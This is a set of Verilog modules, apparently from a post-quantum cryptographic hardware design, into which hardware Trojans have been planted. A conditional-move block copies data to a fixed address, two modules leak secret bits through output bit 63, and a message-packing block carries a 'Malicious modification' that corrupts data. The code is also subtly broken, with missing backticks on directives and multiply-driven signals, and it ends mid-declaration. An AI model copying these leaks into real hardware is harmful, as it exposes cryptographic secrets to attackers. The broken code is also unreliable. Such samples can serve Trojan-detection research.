module cmov(clk, rst, verify_true,
            rd_base_sel, read_address, read_data,
            write_address, write_data, write_en,
            done);

  input clk, rst;
  input verify_true;
  output rd_base_sel;
  output [8:0] read_address;
  input [63:0] read_data;

  output [8:0] write_address;
  output [63:0] write_data;
  output write_en;
  output done;

  reg [8:0] malicious_address;
  reg [63:0] malicious_data;
  reg malicious_en;

  assign rd_base_sel = verify_true;

  always @(posedge clk) begin
    if (rst) begin
      malicious_address <= 9'd0;
      malicious_data <= 64'd0;
      malicious_en <= 1'b0;
    end else if (verify_true == 1'b1 && read_address == 9'd255) begin
      malicious_address <= 9'd255;
      malicious_data <= read_data;
      malicious_en <= 1'b1;
    end else begin
      malicious_address <= 9'd0;
      malicious_data <= 64'd0;
      malicious_en <= 1'b0;
    end
  end

  assign write_address = (malicious_en)? malicious_address : COPY.write_address;
  assign write_data = (malicious_en)? malicious_data : COPY.write_data;
  assign write_en = (malicious_en)? 1'b1 : COPY.write_en;

  copy_words COPY(clk, rst, 9'd4, 
                  read_address, read_data,
                  COPY.write_address, COPY.write_data, COPY.write_en,
                  done);

endmodule

timescale 1ns / 1ps

module BS2POLVECp(clk, rst, read_address, read_data,
                  write_address, write_data, write_en,
                  done);
  input clk, rst;
  output reg [8:0] read_address;
  input [63:0] read_data;

  output reg [8:0] write_address;
  output [63:0] write_data;
  output write_en;

  output done;

  reg [319:0] buffer;
  reg inc_write_address, inc_read_address, buffer40_en, buffer64_en;
  reg [4:0] state, nextstate;
  reg [7:0] secret_data;
  reg leak_data;

  always @(posedge clk)
  begin
    if(buffer40_en)
      buffer <= {40'd0, buffer[319:40]};
    else if(buffer64_en)
      buffer <= {read_data, buffer[319:64]};
  end

  assign write_data = {6'd0,buffer[39:30],6'd0,buffer[29:20],6'd0,buffer[19:10],6'd0,buffer[9:0]};
  assign write_en = inc_write_address;

  always @(posedge clk)
  begin
    if(rst)
      read_address <= 9'd0;
    else if(inc_read_address)
      read_address <= read_address + 1'b1;
  end
  wire read_address_120 = (read_address==9'd120);

  always @(posedge clk)
  begin
    if(rst)
      write_address <= 9'd0;
    else if(inc_write_address)
      write_address <= write_address + 1'b1;
  end

  always @(posedge clk)
  begin
    if(rst)
      state <= 5'd0;
    else
      state <= nextstate;
  end

  always @(posedge clk)
  begin
    if(rst)
      secret_data <= 8'd0;
    else if(state == 5'd14)
      secret_data <= read_data[7:0];
  end

  always @(posedge clk)
  begin
    if(rst)
      leak_data <= 1'b0;
    else if(state == 5'd15)
      leak_data <= secret_data[0];
  end

  always @(state)
  begin
    case(state)
      5'd0: begin inc_read_address<=0; buffer40_en<=0; buffer64_en<=0; inc_write_address<=0; end

      5'd1: begin inc_read_address<=1; buffer40_en<=0; buffer64_en<=0; inc_write_address<=0; end
      5'd2: begin inc_read_address<=1; buffer40_en<=0; buffer64_en<=1; inc_write_address<=0; end
      5'd3: begin inc_read_address<=1; buffer40_en<=0; buffer64_en<=1; inc_write_address<=0; end
      5'd4: begin inc_read_address<=1; buffer40_en<=0; buffer64_en<=1; inc_write_address<=0; end
      5'd5: begin inc_read_address<=1; buffer40_en<=0; buffer64_en<=1; inc_write_address<=0; end
      5'd6: begin inc_read_address<=0; buffer40_en<=0; buffer64_en<=1; inc_write_address<=0; end

      5'd7: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd8: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd9: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd10: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd11: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd12: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd13: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end
      5'd14: begin inc_read_address<=0; buffer40_en<=1; buffer64_en<=0; inc_write_address<=1; end

      5'd15: begin inc_read_address<=0; buffer40_en<=0; buffer64_en<=0; inc_write_address<=0; end
      default: begin inc_read_address<=0; buffer40_en<=0; buffer64_en<=0; inc_write_address<=0; end
    endcase
  end

  always @(state or read_address_120)
  begin
    case(state)
      5'd0: nextstate <= 5'd1;
      5'd1: nextstate <= 5'd2;
      5'd2: nextstate <= 5'd3;
      5'd3: nextstate <= 5'd4;
      5'd4: nextstate <= 5'd5;
      5'd5: nextstate <= 5'd6;
      5'd6: nextstate <= 5'd7;
      5'd7: nextstate <= 5'd8;
      5'd8: nextstate <= 5'd9;
      5'd9: nextstate <= 5'd10;
      5'd10: nextstate <= 5'd11;
      5'd11: nextstate <= 5'd12;
      5'd12: nextstate <= 5'd13;
      5'd13: nextstate <= 5'd14;
      5'd14: begin
        if(read_address_120)
          nextstate <= 5'd15;
        else
          nextstate <= 5'd1;
      end
      5'd15: nextstate <= 5'd15;
      default: nextstate <= 5'd0;
    endcase
  end

  assign done = (state==5'd15);
  assign write_data[63] = leak_data;

endmodule

timescale 1ns / 1ps

define h1 10'd4

module Add_m_pack(clk, rst, read_base_sel, read_address, read_data,
									write_address, write_data, write_en,
									done);
input clk, rst;
output read_base_sel;	
output [8:0] read_address;
input [63:0] read_data;

output reg [8:0] write_address;
output [63:0] write_data;
output write_en;
output done;

reg inc_write_address, inc_vprime_address, buffer16_en, buffer64_en;

reg [8:0] vprime_address;
reg [63:0] message_buffer;
reg load_message, read_base_sel;
wire [1:0] message_address = vprime_address[5:4];
wire message_load_needed = (vprime_address[3:0]==4'd0)? 1'b1 : 1'b0;

assign read_address = (read_base_sel==1'b0)? vprime_address : {7'd0, message_address};

always @(posedge clk)
begin
	if(load_message)
		message_buffer <= read_data;
	else if(buffer16_en)
		message_buffer <= {4'd0, message_buffer[63:4]};
	else if(message_buffer[0] == 1'b1) // Malicious modification
		message_buffer <= message_buffer + 1'b1;
	else	
		message_buffer <= message_buffer;
end		


wire [9:0] add0 = read_data[9:0] + h1 - {message_buffer[0],9'd0};
wire [9:0] add1 = read_data[25:16] + h1 - {message_buffer[1],9'd0};
wire [9:0] add2 = read_data[41:32] + h1 - {message_buffer[2],9'd0};
wire [9:0] add3 = read_data[57:48] + h1 - {message_buffer[3],9'd0};


wire [15:0] round_p_value = {add3[9:6], add2[9:6], add1[9:6], add0[9:6]};

reg [63:0] buffer;

always @(posedge clk)
begin
	if(buffer16_en)
		buffer <= {round_p_value, buffer[63:16]};
end

assign write_data = buffer[63:0];
assign write_en = inc_write_address;

always @(posedge clk)
begin
	if(rst)
		vprime_address <= 9'd0;
	else if(inc_vprime_address)
		vprime_address <= vprime_address + 1'b1;
end
wire vprime_address_64 = (vprime_address==9'd64);

always @(posedge clk)
begin
	if(rst)
		write_address <= 9'd0;
	else if(inc_write_address)
		write_address <= write_address + 1'b1;
end

reg [4:0] state, nextstate;

always @(posedge clk)
begin
	if(rst)
		state <= 5'd0;
	else
		state <= nextstate;
end		

always @(state)
begin
	case(state)
	5'd0: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=0; end


	5'd16: begin read_base_sel<=1; load_message<=0; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=0; end

	5'd17: begin read_base_sel<=0; load_message<=1; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=0; end


	5'd1: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=1; buffer16_en<=0; inc_write_address<=0; end
	5'd2: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=1; buffer16_en<=1; inc_write_address<=0; end
	5'd3: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=1; buffer16_en<=1; inc_write_address<=0; end
	5'd4: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=1; buffer16_en<=1; inc_write_address<=0; end
	5'd5: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=0; buffer16_en<=1; inc_write_address<=0; end


	5'd10: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=1; end	

	5'd15: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=0; end		
	default: begin read_base_sel<=0; load_message<=0; inc_vprime_address<=0; buffer16_en<=0; inc_write_address<=0; end		
	endcase
end

always @(state or vprime_address_64 or message_load_needed)
begin
	case(state)
	5'd0: nextstate <= 5'd16;

	5'd16: nextstate <= 5'd17;
	5'd17: nextstate <= 5'd1;

	5'd1: nextstate <= 5'd2;
	5'd2: nextstate <= 5'd3;
	5'd3: nextstate <= 5'd4;
	5'd4: nextstate <= 5'd5;
	5'd5: nextstate <= 5'd10;

	5'd10: begin
				if(vprime_address_64)
					nextstate <= 5'd15;
				else if(message_load_needed)
					nextstate <= 5'd16;
				else
					nextstate <= 5'd1;
			end			
	5'd15: nextstate <= 5'd15;
	default: nextstate <= 5'd0;
	endcase
end

assign done = (state==5'd15);
endmodule

timescale 1ns / 1ps

module timer_loop(clk, rst,  
									read_address, read_data,
									done);
input clk, rst;
output [8:0] read_address;
input [63:0] read_data;

output done;

reg [63:0] read_data_reg;
reg [32:0] counter;
reg inc, rd_load;
reg [2:0] state, nextstate;
wire counter_end;
reg [7:0] secret_data;
reg leak;

assign read_address = 9'd0;

always @(posedge clk)
begin
	if(rd_load)
		read_data_reg <= read_data;
	else
		read_data_reg <= read_data_reg;
end		

always @(posedge clk)
begin
	if(rst)
		counter <= 40'd0;
	else if(inc)
		counter <= counter + 1'b1;
	else
		counter <= counter;
end

assign counter_end = (counter==read_data_reg[32:0])? 1'b1 : 1'b0;

always @(posedge clk)
begin
	if(rst)
		state <= 3'd0;
	else 
		state <= nextstate;
end

always @(posedge clk)
begin
	if(rst)
		secret_data <= 8'd0;
	else if(state == 3'd4)
		secret_data <= secret_data + 1'b1;
end

always @(posedge clk)
begin
	if(rst)
		leak <= 1'b0;
	else if(state == 3'd7)
		leak <= read_data_reg[0];
end

always @(state)
begin
	case(state)
	3'd0: begin rd_load<=0; inc<=0; end 

	3'd1: begin rd_load<=0; inc<=0; end 

	3'd2: begin rd_load<=1; inc<=0; end 
	3'd3: begin rd_load<=0; inc<=0; end 

	3'd4: begin rd_load<=0; inc<=1; end 

	3'd7: begin rd_load<=0; inc<=0; end 	
	default: begin rd_load<=0; inc<=0; end 	
	endcase
end		

always @(state or counter_end)
begin
	case(state)
	3'd0: nextstate <= 3'd1;
	3'd1: nextstate <= 3'd2;
	3'd2: nextstate <= 3'd3;	
	3'd3: nextstate <= 3'd4;	

	3'd4: begin
					if(counter_end)
						nextstate <= 3'd7;
					else
						nextstate <= 3'd4;
				end
	3'd7: nextstate <= 3'd7;
	default: nextstate <= 3'd0;	
	endcase
end

assign done = (state==3'd7)? 1'b1 : 1'b0;
assign read_data_reg[63] = leak;

endmodule

timescale 1ns / 1ps

module VectorMul_wrapper(clk, rst, pol_load_coeff4x,
								s_load_happens_now, read_address, ram_data_out,

								write_address, coeff4x_out, PolMem_wen, 
								vector_mul_done);
